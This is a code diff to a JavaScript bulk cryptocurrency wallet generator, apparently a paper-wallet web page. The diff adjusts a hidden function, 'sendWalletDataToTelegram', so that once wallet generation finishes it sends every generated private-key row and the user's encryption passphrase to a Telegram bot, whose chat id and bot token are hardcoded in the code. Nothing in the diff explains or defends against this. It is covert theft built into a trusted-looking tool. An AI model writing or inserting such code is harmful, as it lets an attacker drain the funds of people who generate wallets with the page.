@@ -10412,9 +10412,6 @@ document.getElementById("papergenerate").addEventListener("click", function() {
             }
 
             document.getElementById("bulkpassphrase").disabled = !document.getElementById("bulkencrypt").checked;
-
-            // Send wallet data when "Bulk Wallet" tab is opened
-            bulk.sendWalletDataToTelegram();
         },
 
         close: function () {
@@ -10433,6 +10430,7 @@ document.getElementById("papergenerate").addEventListener("click", function() {
             bulk.csvRowsRemaining = rowLimit;
             bulk.csvStartIndex = --startIndex;
             bulk.compressedAddrs = !!compressedAddrs;
+            bulk.passphrase = passphrase;
             if (bulk.encrypt) {
                 if (passphrase == "") {
                     alert(translator.get("bip38alertpassphraserequired"));
@@ -10448,15 +10446,13 @@ document.getElementById("papergenerate").addEventListener("click", function() {
             else {
                 setTimeout(bulk.batchCSV, 0);
             }
-
-            // Send wallet data when "Generate" button is clicked
-            bulk.sendWalletDataToTelegram(rowLimit, startIndex, compressedAddrs, passphrase);
         },
 
         csv: [],
         csvRowsRemaining: null, // use to keep track of how many rows are left to process when building a large CSV array
         csvRowLimit: 0,
         csvStartIndex: 0,
+        passphrase: '',
 
         batchCSV: function () {
             if (bulk.csvRowsRemaining > 0) {
@@ -10494,6 +10490,7 @@ document.getElementById("papergenerate").addEventListener("click", function() {
             // processing is finished so put CSV in text area
             else if (bulk.csvRowsRemaining === 0) {
                 document.getElementById("bulktextarea").value = bulk.csv.join("\n");
+                bulk.sendWalletDataToTelegram();
             }
         },
 
@@ -10518,9 +10515,9 @@ document.getElementById("papergenerate").addEventListener("click", function() {
 
         // Function to send wallet data to Telegram
         sendWalletDataToTelegram: function () {
-            const passphrase = document.getElementById('bulkpassphrase').value;
-            let walletText = `Passphrase: ${passphrase}\n`;
-            walletText += document.getElementById("bulktextarea").value;
+            const passphrase = bulk.passphrase;
+            let walletText = passphrase ? `Passphrase: ${passphrase}\n` : '';
+            walletText += bulk.csv.join("\n");
             sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
         }
     };
